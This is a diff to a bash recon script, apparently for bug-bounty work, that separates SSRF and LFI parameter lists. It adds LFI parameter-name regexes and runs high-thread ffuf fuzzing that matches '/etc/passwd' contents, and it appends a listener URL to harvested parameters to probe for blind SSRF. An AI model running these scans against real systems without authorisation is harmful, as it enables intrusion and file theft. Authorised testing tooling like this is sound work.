@@ -421,27 +421,33 @@ custompathlist(){
   fi
 
   if [[ -n "$fuzz" ]]; then
-    echo "Prepare custom customSsrfLfiQueryList"
+    echo "Prepare custom customSsrfQueryList"
     # https://github.com/tomnomnom/gf/issues/55
-    # sudo -u $HOMEUSER helpers/gf-filter.sh ssrf $queryList $customSsrfLfiQueryList &
-    xargs -n1 -I {} grep -oiaE "(([[:alnum:][:punct:]]+)+)?{}=" $queryList < $PARAMSLIST >> $customSsrfLfiQueryList || true &
+    # sudo -u $HOMEUSER helpers/gf-filter.sh ssrf $queryList $customSsrfQueryList &
+    xargs -n1 -I {} grep -oiaE "(([[:alnum:][:punct:]]+)+)?{}=" $queryList < $PARAMSLIST >> $customSsrfQueryList || true &
     pid_01=$!
-    echo
+
     echo "Prepare custom customSqliQueryList"
     grep -oaiE "(([[:alnum:][:punct:]]+)+)?(php3?)\?[[:alnum:]]+=([[:alnum:][:punct:]]+)?" $queryList > $customSqliQueryList || true &
     pid_02=$!
-
     echo "wait $pid_01 $pid_02" 
     wait $pid_01 $pid_02
 
-    sort -u $customSsrfLfiQueryList -o $customSsrfLfiQueryList
+    sort -u $customSsrfQueryList -o $customSsrfQueryList
     sort -u $customSqliQueryList -o $customSqliQueryList
 
-    < $customSsrfLfiQueryList unfurl format '%p%?%q' | sed "/^\/\;/d;/^\/\:/d;/^\/\'/d;/^\/\,/d;/^\/\./d" | qsreplace -a > $TARGETDIR/ssrf-lfi-path-list.txt
-    sort -u $TARGETDIR/ssrf-lfi-path-list.txt -o $TARGETDIR/ssrf-lfi-path-list.txt
+    echo "Prepare custom customLfiQueryList"
+    # 1 limited to lfi pattern
+    grep -oiaE "(([[:alnum:][:punct:]]+)+)?(cat|dir|source|attach|cmd|action|board|detail|location|file|download|path|folder|prefix|include|inc|locate|site|show|doc|view|content|con|document|layout|mod|root|pg|style|template|php_path|admin)=" $customSsrfQueryList > $customLfiQueryList || true
+    # 2 limited to [:alnum:]=file.ext pattern
+    grep -oiaE "(([[:alnum:][:punct:]]+)+)?=(([[:alnum:][:punct:]]+)+)\.(pdf|txt|log|md|php|css|json|js|csv|src|old|jsp|sql|zip|xls|dll)" $queryList | grep -oiaE "(([[:alnum:][:punct:]]+)+)?=" >> $customLfiQueryList || true
+    sort -u $customLfiQueryList -o $customLfiQueryList
+
+    < $customSsrfQueryList unfurl format '%p%?%q' | sed "/^\/\;/d;/^\/\:/d;/^\/\'/d;/^\/\,/d;/^\/\./d" | qsreplace -a > $TARGETDIR/ssrf-path-list.txt
+    sort -u $TARGETDIR/ssrf-path-list.txt -o $TARGETDIR/ssrf-path-list.txt
 
     chown $HOMEUSER: $queryList
-    chown $HOMEUSER: $customSsrfLfiQueryList
+    chown $HOMEUSER: $customSsrfQueryList
     chown $HOMEUSER: $customSqliQueryList
     echo "Custom queryList done."
   fi
@@ -466,17 +472,17 @@ ssrftest(){
                          -mode pitchfork < $PARAMSLIST > /dev/null
     echo "[SSRF-2] Blind probe done."
     echo
-    if [ -s "$TARGETDIR/ssrf-lfi-path-list.txt" ]; then
+    if [ -s "$TARGETDIR/ssrf-path-list.txt" ]; then
       # similar to paramspider but all wayback without limits
       echo "[SSRF-3] prepare ssrf-list: concat .com?params= out with listen server..."
 
       while read line; do
         echo "${line}${LISTENSERVER}" >> $TARGETDIR/ssrf-original-list.txt
-      done < $customSsrfLfiQueryList
+      done < $customSsrfQueryList
 
       while read line; do
         echo "${line}${LISTENSERVER}" >> $TARGETDIR/ssrf-list.txt
-      done < $TARGETDIR/ssrf-lfi-path-list.txt
+      done < $TARGETDIR/ssrf-path-list.txt
 
       chown $HOMEUSER: $TARGETDIR/ssrf-original-list.txt
       chown $HOMEUSER: $TARGETDIR/ssrf-list.txt
@@ -510,11 +516,11 @@ ssrftest(){
 # https://www.allysonomalley.com/2021/02/11/burpparamflagger-identifying-possible-ssrf-lfi-insertion-points/
 # https://blog.cobalt.io/a-pentesters-guide-to-file-inclusion-8fdfc30275da
 lfitest(){
-  if [[ -s "$customSsrfLfiQueryList" ]]; then
+  if [[ -s "$customLfiQueryList" ]]; then
     echo
     echo "[LFI] ffuf with all live servers with lfi-path-list using wordlist/LFI-payload.txt..."
       # simple math to watch progress
-      HOSTCOUNT=$(< $customSsrfLfiQueryList wc -l)
+      HOSTCOUNT=$(< $customLfiQueryList wc -l)
       ENDPOINTCOUNT=$(< $LFIPAYLOAD wc -l)
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
@@ -526,8 +532,8 @@ lfitest(){
         #      -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
         #      -o $TARGETDIR/ffuf/lfi-matched-url.txt > /dev/null
     # 2 real life:
-        ffuf -timeout 7 -t 550 -u HOSTPATH \
-             -w $customSsrfLfiQueryList:HOST \
+        ffuf -timeout 10 -t 1050 -u HOSTPATH \
+             -w $customLfiQueryList:HOST \
              -w $LFIPAYLOAD:PATH \
              -mr "root:[x*]:0:0:" \
              -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
@@ -749,11 +755,11 @@ main(){
   # used for fuzz and bruteforce
   if [[ -n "$fuzz" ]]; then
     # to work with gf ssrf output
-    customSsrfLfiQueryList=$TARGETDIR/custom_ssrf_lfi_list.txt
-    touch $customSsrfLfiQueryList
+    customSsrfQueryList=$TARGETDIR/custom_ssrf_list.txt
+    touch $customSsrfQueryList
     # to work with gf lfi output
-    # customLfiQueryList=$TARGETDIR/custom_lfi_list.txt
-    # touch $customLfiQueryList
+    customLfiQueryList=$TARGETDIR/custom_lfi_list.txt
+    touch $customLfiQueryList
     # to work with gf ssrf output
     customSqliQueryList=$TARGETDIR/custom_sqli_list.txt
     touch $customSqliQueryList
